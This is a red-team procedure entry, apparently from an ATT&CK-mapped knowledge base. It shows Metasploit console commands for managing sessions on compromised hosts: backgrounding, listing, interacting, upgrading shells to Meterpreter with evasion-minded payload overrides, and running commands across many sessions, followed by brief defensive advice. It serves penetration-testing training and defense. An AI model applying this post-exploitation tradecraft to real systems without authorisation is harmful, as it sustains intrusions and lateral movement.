---
id: d4478798-8427-4129-9807-1375ed7afd8e
name: Session-Management-with-Metasploit
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:21.214097+00:00'
updated_at: '2023-05-26T00:58:31.940456+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Command-Line Interface|T1059 - Command-Line Interface]]'
  - '[[techniques/Remote Access Tools|T1219 - Remote Access Tools]]'
sub_techniques:
  - '[[sub-techniques/PowerShell|T1059.001 - PowerShell]]'
tags:
  - '[[tags/Metasploit]]'
  - '[[tags/Sessions]]'
commands:
  - '[[commands/metasploit-background-session]]'
  - '[[commands/metasploit-list-sessions]]'
  - '[[commands/metasploit-interact-with-session]]'
  - '[[commands/metasploit-upgrade-to-meterpreter]]'
  - '[[commands/metasploit-upgrade-to-meterpreter-custom]]'
  - '[[commands/metasploit-execute-on-multiple-sessions]]'
  - '[[commands/metasploit-execute-on-session-range]]'
platforms:
  - Linux
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Session-Management-with-Metasploit

## Summary

Session management with Metasploit allows attackers to handle multiple active connections to compromised systems after initial exploitation. This procedure covers listing, interacting with, backgrounding, upgrading, and executing commands across sessions, enabling persistent access, lateral movement, and post-exploitation activities in a target environment.

## Description

In post-exploitation scenarios, Metasploit establishes sessions through payloads like reverse shells or Meterpreter, representing remote access to targets. This procedure details how to manage these sessions within the Metasploit console, including viewing active sessions, switching between them, suspending them to the background for multitasking, upgrading basic shells to advanced Meterpreter sessions for enhanced capabilities, and running commands across multiple sessions simultaneously. It is typically used after gaining initial foothold via exploits, in environments like corporate networks where maintaining stealthy, multi-host access is key. Prerequisites include a running Metasploit instance with established sessions from prior exploits.

## Requirements

1. Running Metasploit Framework instance (msfconsole) with active exploits or payloads that have generated sessions.
2. Network connectivity to the target systems for maintaining session persistence.
3. Basic knowledge of Metasploit console navigation and payload types (e.g., reverse_tcp).

## Defense

- Enable endpoint detection and response (EDR) tools to monitor for suspicious process spawning and network callbacks associated with Metasploit payloads.
- Implement network segmentation and firewall rules to block unauthorized outbound connections to common C2 ports.
- Regularly audit and kill idle or anomalous processes on endpoints, and use application whitelisting to prevent unauthorized binary execution.

## Objectives

1. View and select active sessions for management.
2. Maintain persistent access by backgrounding and upgrading sessions.
3. Execute commands across multiple targets to facilitate lateral movement or data collection.

## Instructions

### Step 1: Background Current Session

**Context**: When working with multiple sessions, background the active one to return to the main Metasploit console without terminating the connection. This allows switching between sessions efficiently.

**Command** ([[commands/metasploit-background-session]]):
```msfconsole
CTRL+Z
```

> Pressing CTRL+Z suspends the current session, returning control to the msfconsole prompt. This is useful for multitasking without losing access.

### Step 2: List All Available Sessions

**Context**: After backgrounding or establishing new sessions, list them to identify active connections, their types (e.g., shell or Meterpreter), and associated targets.

**Command** ([[commands/metasploit-list-sessions]]):
```msfconsole
sessions
```

> This command displays a table of all sessions, including IDs, types, start times, and target info. Use this to select the next session to interact with.

### Step 3: Interact with a Specific Session

**Context**: Select and enter a specific session to execute commands directly on the target, such as running system commands or uploading tools.

**Command** ([[commands/metasploit-interact-with-session]]):
```msfconsole
sessions -i $_SESSION_ID
```

> Replace $_SESSION_ID with the numeric ID from the sessions list. This drops you into the session's shell or Meterpreter prompt for interactive control.

### Step 4: Upgrade Session to Meterpreter

**Context**: Basic shell sessions lack advanced features; upgrade to Meterpreter for capabilities like file system access, keylogging, and evasion techniques.

**Command** ([[commands/metasploit-upgrade-to-meterpreter]]):
```msfconsole
sessions -u $_SESSION_ID
```

> This attempts to upgrade the specified session using default settings. Success grants a full Meterpreter shell with extended post-exploitation modules.

### Step 5: Upgrade Session to Meterpreter with Custom Options

**Context**: For environments with specific network constraints, customize the upgrade payload, such as changing ports or payload types to evade detection.

**Command** ([[commands/metasploit-upgrade-to-meterpreter-custom]]):
```msfconsole
sessions -u $_SESSION_ID LPORT=$_LPORT PAYLOAD_OVERRIDE=$_PAYLOAD HANDLER=false
```

> Set $_LPORT to a custom port (e.g., 4444), $_PAYLOAD to something like 'windows/meterpreter/reverse_tcp'. The HANDLER=false option prevents auto-starting a listener if one is already configured.

### Step 6: Execute Command on Multiple Sessions

**Context**: To perform actions across all or selected sessions simultaneously, such as gathering system info, without interacting with each individually.

**Command** ([[commands/metasploit-execute-on-multiple-sessions]]):
```msfconsole
sessions -c "$_COMMAND"
```

> Replace $_COMMAND with the desired command (e.g., 'whoami'). This runs it on all active sessions and aggregates output for efficiency in large engagements.

### Step 7: Execute Command on a Range of Sessions

**Context**: Target a subset of sessions, like those on similar hosts, to run commands on a specific range for focused operations like privilege checks.

**Command** ([[commands/metasploit-execute-on-session-range]]):
```msfconsole
sessions -i $_SESSION_RANGE -c "$_COMMAND"
```

> Specify $_SESSION_RANGE as '1-5' and $_COMMAND as 'id' for Unix-like systems. This limits execution to the defined IDs, useful for segmented networks.
